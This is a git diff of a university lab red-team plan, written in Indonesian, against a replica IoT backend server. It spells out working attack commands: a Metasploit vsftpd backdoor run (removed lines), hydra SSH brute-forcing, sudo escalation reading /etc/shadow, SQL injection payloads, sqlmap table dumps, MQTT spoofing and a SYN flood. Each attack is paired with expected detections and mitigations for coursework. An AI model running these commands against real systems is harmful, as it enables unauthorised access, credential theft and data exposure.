@@ -1,6 +1,6 @@
 # Red Team Attack Plan — Fase 2 (Minggu 10–11)
 
-**Kelompok 4 · TEK1314 Kelas A · Target Node replika:** `192.168.4.5` (Metasploitable2)
+**Kelompok 4 · TEK1314 Kelas A · Target Node replika:** `192.168.4.5` (Ubuntu Server LTS 26.04)
 **Attacker Node:** `192.168.4.100` (Kali Linux) · **Monitoring:** `192.168.4.200` (Security Onion)
 **Penyusun:** Red Team — Raka Syauqi Ferdian (J0404241112), Zidan
 
@@ -23,20 +23,24 @@ dengan celah nyata hasil riset Minggu 4.
 
 | ID | Kategori (Bagian IX) | Teknik | Tools | Target | Ekspektasi hasil |
 |---|---|---|---|---|---|
-| RT-01 | Reconnaissance | Port/service scan + OS fingerprinting + enumerasi banner | `nmap`, `whatweb`, Wireshark | `192.168.4.5` | Peta port lengkap; identifikasi vsftpd 2.3.4 & MySQL 5.0.51a sebagai kandidat |
-| RT-02 | Exploitation / Akses | Eksploitasi CVE-2011-2523 (vsftpd 2.3.4 backdoor) → root shell; fallback default credential | Metasploit (`exploit/unix/ftp/vsftpd_234_backdoor`), Hydra | `192.168.4.5:21`, `:22` | Shell `uid=0(root)` pada port 6200 → kompromi penuh server backend |
-| RT-03 | Web/API/Protokol IoT | SQL injection pada endpoint data sensor (dashboard DVWA) | sqlmap, Burp Suite | `http://192.168.4.5/dvwa/`, `:80` | Dump tabel `users` + `sensor_readings` → kebocoran data operasional |
+| RT-01 | Reconnaissance | Port/service scan + OS fingerprinting + enumerasi banner | `nmap`, `whatweb`, Wireshark | `192.168.4.5` | Peta port lengkap; identifikasi nginx, MariaDB, Mosquitto, OpenSSH sebagai kandidat |
+| RT-02 | Exploitation / Akses | Brute-force kredensial lemah → login SSH → eskalasi sudo | `hydra`, Metasploit (`auxiliary/scanner/ssh/ssh_login`) | `192.168.4.5:22` (→ `:2222` setelah A-3) | Login sebagai `iotadmin`, `sudo -l` penuh → kompromi server backend |
+| RT-03 | Web/API/Protokol IoT | SQL injection pada endpoint data sensor (dashboard DVWA) | sqlmap, Burp Suite | `http://192.168.4.5/iot-dashboard/`, `:80` | Dump tabel `users` + `sensor_readings` → kebocoran data operasional |
 | RT-04 | Web/API/Protokol IoT | MQTT topic hijack / spoof publish ke topik aktuator (kondisional, butuh broker 1883) | mosquitto_pub, MQTT Explorer | `192.168.4.5:1883` | Perintah palsu "pompa ON" diterima broker tanpa autentikasi |
 | RT-05 | Availability (maks. 1) | SYN flood sederhana pada layanan web | hping3 | `192.168.4.5:80` | Dashboard tidak dapat diakses selama serangan |
 
 Kategori terpakai: **4 dari 5** (Recon, Exploitation, Web/API/IoT, Availability). Sesuai
 ketentuan, Availability hanya 1 dari 5.
 
+> **Revisi Minggu 9:** Target Node kini **Ubuntu Server LTS 26.04** (bukan Metasploitable2) agar
+> replika menyerupai backend IoT dan `ufw`/`fail2ban`/`apt` berfungsi. Kelemahan yang diuji
+dipasang sengaja — daftarnya di `docs/design/replica_setup.md` Bagian 3.
+
 ## 2. RT-01 · Reconnaissance (pemetaan permukaan serangan)
 
-**Kaitan riset Minggu 4:** port 21 (vsftpd 2.3.4), 22 (OpenSSH 4.7p1), 80 (Apache 2.2.8 +
-DVWA/phpMyAdmin), 3306 (MySQL 5.0.51a), 23 (telnet), 445 (Samba 3.0.20) — semuanya versi usang
-yang punya CVE publik.
+**Kaitan riset Minggu 4 + setup replika:** target membuka 22 (OpenSSH), 80 (nginx + PHP +
+DVWA), 3306 (MariaDB), 1883 (Mosquitto). Celahnya bukan versi usang, melainkan konfigurasi yang
+sengaja dibuat lemah (kredensial, SQLi, MQTT tanpa auth) — rincian di `docs/design/replica_setup.md`.
 
 ```bash
 # 1. host discovery + full TCP scan + versi + OS fingerprint
@@ -55,32 +59,39 @@ sudo tcpdump -i eth0 -w rt01_scan.pcap host 192.168.4.5
 Suricata ET SCAN; lonjakan koneksi SYN ke banyak port dalam <60 detik.
 **Mitigasi yang akan diuji (checklist):** B-1, B-2 (pengurangan port terbuka & filtered).
 
-## 3. RT-02 · Exploitation — backdoor vsftpd 2.3.4 (CVE-2011-2523)
+## 3. RT-02 · Exploitation — kredensial lemah & eskalasi di server backend
 
-**Kaitan riset Minggu 4:** port 21 melayani vsftpd 2.3.4, versi yang secara sengaja menyisipkan
-backdoor: login dengan username berakhiran `:)` membuka shell root pada port 6200.
+**Kaitan riset Minggu 4:** target menjalankan SSH dengan autentikasi password dan user
+manajemen `iotadmin` dengan password lemah (kelemahan disengaja #1, lihat
+`docs/design/replica_setup.md`). Ini merepresentasikan kesalahan paling umum di backend IoT
+nyata: kredensial default/lemah pada layanan manajemen, bukan exploit eksotis.
 
 ```bash
-# Metasploit
-msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; \
-  set RHOSTS 192.168.4.5; set RPORT 21; set PAYLOAD cmd/unix/interact; run"
-# verifikasi
-id          # harapan: uid=0(root)
-uname -a
-cat /etc/shadow | head -3      # bukti dampak (data disensor saat dilampirkan)
+# 1. brute-force SSH dengan wordlist (skala lab, terbatas)
+hydra -l iotadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.4.5 -t 4 -f -V
+# catatan: setelah A-3 diterapkan, port = 2222 -> tambahkan -s 2222
 
-# fallback bila backdoor sudah ditutup hardening: default credential
-hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.4.5 -t 4 -f
-# catatan: setelah A-3 diterapkan, port SSH = 2222 -> sesuaikan -s 2222
+# 2. bila kredensial ditemukan, masuk dan ukur dampak
+ssh iotadmin@192.168.4.5
+id; hostname; uname -a
+sudo -l                      # harapan: user punya sudo -> eskalasi ke root
+sudo cat /etc/shadow | head -3
+mysql -u iotadmin -p iot_db -e "SELECT * FROM sensor_readings LIMIT 5;"
+# alternatif Metasploit
+msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS 192.168.4.5; \
+  set USERNAME iotadmin; set PASS_FILE /usr/share/wordlists/rockyou.txt; run"
 ```
 
-**Hasil yang diharapkan:** shell root tanpa autentikasi → kontrol penuh server (setara
-"penyerang menguasai server backend IoT, bisa mengubah data sensor & menghentikan pompa").
-**Deteksi yang diharapkan:** alert Suricata ET EXPLOIT vsftpd 2.3.4 backdoor; Zeek notice
-`FTP::Bad_Guy` / koneksi keluar ke port 6200 (bukti post-exploitation); log `auth.log`.
-**Mitigasi yang akan diuji:** B-1 (matikan FTP), B-2 (ufw blokir 21), B-3 (patch/upgrade vsftpd).
-**Tahap 5 (verifikasi):** ulangi perintah → koneksi 21 `filtered`/`closed`, eksploit gagal, alert
-tetap muncul saat percobaan.
+**Hasil yang diharapkan:** login berhasil sebagai `iotadmin`, `sudo -l` menunjukkan hak sudo
+penuh → penyerang menguasai server backend (bisa mengubah data sensor, mematikan layanan, dan
+memalsukan perintah aktuator).
+**Deteksi yang diharapkan:** `auth.log` berisi `Failed password` berulang diikuti
+`Accepted password`; Zeek `conn.log` menunjukkan banyak koneksi singkat ke port 22/2222;
+Suricata ET SCAN/brute-force (bila rule aktif).
+**Mitigasi yang akan diuji:** A-2 (key-only), A-4 (fail2ban), B-3 (password kuat), A-1
+(no root login).
+**Tahap 5 (verifikasi):** ulangi hydra → ditolak/ter-ban; login password gagal; `sudo -l` tidak
+lagi memberi hak penuh (user tidak masuk grup sudo).
 
 ## 4. RT-03 · Web/API — SQL injection pada endpoint data sensor
 
@@ -90,10 +101,10 @@ dipakai endpoint `api/sensor` pada dashboard monitoring.
 
 ```bash
 # 1. konfirmasi manual
-curl "http://192.168.4.5/dvwa/vulnerabilities/sqli/?id=1'&Submit=Submit"      # error SQL
-curl "http://192.168.4.5/dvwa/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit"
+curl "http://192.168.4.5/iot-dashboard/vulnerabilities/sqli/?id=1'&Submit=Submit"      # error SQL
+curl "http://192.168.4.5/iot-dashboard/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit"
 # 2. otomatisasi dump
-sqlmap -u "http://192.168.4.5/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+sqlmap -u "http://192.168.4.5/iot-dashboard/vulnerabilities/sqli/?id=1&Submit=Submit" \
   --cookie="PHPSESSID=<sesi-valid>; security=low" --batch --dbs --dump -T users
 sqlmap -u "http://192.168.4.5/pbl/api.php?id=1" --batch --technique=BEU --level=3 --risk=2
 # 3. alternatif GUI (bukti untuk slide)
@@ -163,7 +174,7 @@ muncul di log.
 | Skenario | Kategori | Deteksi utama (Blue Team) | Kontrol penutup (checklist) |
 |---|---|---|---|
 | RT-01 | Reconnaissance | Zeek `Port_Scan`, Suricata ET SCAN | B-1, B-2 |
-| RT-02 | Exploitation | ET EXPLOIT vsftpd 2.3.4, `auth.log`, koneksi :6200 | B-1, B-2, B-3 |
+| RT-02 | Exploitation | `auth.log` (Failed → Accepted password berulang), Zeek `conn.log` | A-1, A-2, A-4, B-3 |
 | RT-03 | Web/API | ET WEB_SERVER SQLi, Zeek `http.log` (URI anomali) | C-2, C-3, B-2 |
 | RT-04 | Web/API/IoT | Rule kustom MQTT (publish dari IP non-gateway) | C-2, A-2, B-2 |
 | RT-05 | Availability | ET DOS SYN flood, Zeek `conn.log` (S0 tinggi) | ufw limit, syncookies |
